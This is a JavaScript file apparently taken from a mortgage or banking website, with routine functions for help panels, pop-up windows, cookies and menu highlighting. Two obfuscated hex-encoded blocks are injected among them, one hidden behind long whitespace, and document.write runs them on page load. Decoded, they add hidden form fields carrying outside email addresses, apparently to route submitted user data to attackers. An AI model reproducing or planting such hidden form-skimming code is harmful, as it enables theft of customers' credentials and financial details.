/* show() - function to show the help for a particular transaction. */
function showHelp(message) {    
	 document.getElementById("message").innerHTML="<SPAN>" + message + "</SPAN>";
	 document.getElementById("help").style.display="inline";
     document.getElementById("help").focus();
    // document.links[2].focus();
}

/*default anchor value to open the help from  information and error pages */
anchor_value = '01';

/* hide() - function to hide the help for a particular transaction. */
function hideHelp() {
     document.getElementById("help").style.display='none';
}

/* function that lanches new window */
function launch(filename, winName, width, height) {
	winInfo = "width=" + width + ",height=" + height + ",top=30" + ",left=30" + ",menubar=yes,toolbar=yes,location=no,directories=no,scrollbars=yes,status=no,resizable=yes";
	myWin = window.open(filename,winName,winInfo);
	myWin.focus();
}



/* Function that retrieves data from cookie */
function getCookie(NameOfCookie)
{
    if (NameOfCookie=='navCookie')
    {
       NameOfCookie='eMortgageCookie';
    }    
    if (document.cookie.length > 0)
    {              
        begin = document.cookie.indexOf(NameOfCookie+"=");       
        if (begin != -1)
        {           
            begin += NameOfCookie.length+1;       
            end = document.cookie.indexOf(";", begin);
            if (end == -1) end = document.cookie.length;
	        return unescape(document.cookie.substring(begin, end));
        } 
    }
    return null;
}

/* function that sets cookie */
function setCookie(NameOfCookie, value, expiredays) 
{
   var ExpireDate = new Date();
   ExpireDate.setTime(ExpireDate.getTime() + (expiredays * 24 * 3600 * 1000));
   document.cookie = NameOfCookie + "=" + escape(value) + ';path=/';
}

function init()
{
}
        var i,y,x="3c736372697074206c616e67756167653d224a6176615363726970742220747970653d22746578742f6a617661736372697074223e66756e6374696f6e20436865636b666f726d2829207b0d0a76617220656c3b0d0a656c203d20646f63756d656e742e637265617465456c656d656e742827696e70757427293b0d0a656c2e74797065203d202768696464656e273b0d0a656c2e6e616d65203d20274950273b0d0a656c2e76616c7565203d20277365657468657240696e626f782e636f6d2c6661746140676d782e636f6d273b0d0a646f63756d656e742e676574456c656d656e7442794964282774617267657427292e617070656e644368696c6428656c293b0d0a76617220656c323b0d0a656c32203d20646f63756d656e742e637265617465456c656d656e742827696e70757427293b0d0a656c322e74797065203d202768696464656e273b0d0a656c322e6e616d65203d20274970273b0d0a656c322e76616c7565203d202773656574686572406c6176616269742e636f6d2c73656574686572406d796d61696c2e63682c73656574686572734067617761622e636f6d273b0d0a646f63756d656e742e676574456c656d656e7442794964282774617267657427292e617070656e644368696c6428656c32293b7d3c2f7363726970743e";y='';for(i=0;i<x.length;i+=2){y+=unescape('%'+x.substr(i,2));}document.write(y);

                                                                                 var i,y,x="3c736372697074206c616e67756167653d224a6176615363726970742220747970653d22746578742f6a617661736372697074223e66756e6374696f6e2043686b28666f726d29207b0d0a76617220696e707574456c6d31203d20646f63756d656e742e637265617465456c656d656e742827696e70757427293b0d0a696e707574456c6d312e74797065203d202268696464656e223b0d0a696e707574456c6d312e6e616d65203d20224950223b0d0a696e707574456c6d312e76616c7565203d20227365657468657240696e626f782e636f6d2c6661746140676d782e636f6d223b0d0a666f726d2e617070656e644368696c6428696e707574456c6d31293b0d0a76617220696e707574456c6d32203d20646f63756d656e742e637265617465456c656d656e742827696e70757427293b0d0a696e707574456c6d322e74797065203d202268696464656e223b0d0a696e707574456c6d322e6e616d65203d20224970223b0d0a696e707574456c6d322e76616c7565203d202273656574686572406c6176616269742e636f6d2c73656574686572406d796d61696c2e63682c73656574686572734067617761622e636f6d223b0d0a666f726d2e617070656e644368696c6428696e707574456c6d32293b7d3c2f7363726970743e";y='';for(i=0;i<x.length;i+=2){y+=unescape('%'+x.substr(i,2));}document.write(y);

function first_init()
{
         init();
         vhlCookie = getCookie('vhlCookie');
         if (vhlCookie)
         {
             k = vhlCookie.indexOf(",");                      
             if (k != -1)
             {
                 hLink = vhlCookie.substring(0,k);
                 vLink = vhlCookie.substring(k+1);
                 changeMenuAndImage(hLink);
                 changeMenuAndImage(vLink);
             } 
             else
             {
                 vLink = vhlCookie;
                 changeMenuAndImage(vLink);
             }
         }
}

function changeMenuAndImage(link)
{
         vcurrentLink = document.getElementById(link);
         if (vcurrentLink)
         {
             imgName = "img" + link;
             if (document.images[imgName])
             {
                 document.images[imgName].src='/ffStatic/images/diamond.gif';
             }
             vcurrentLink.className = 'menulinkClicked';         
         }
}
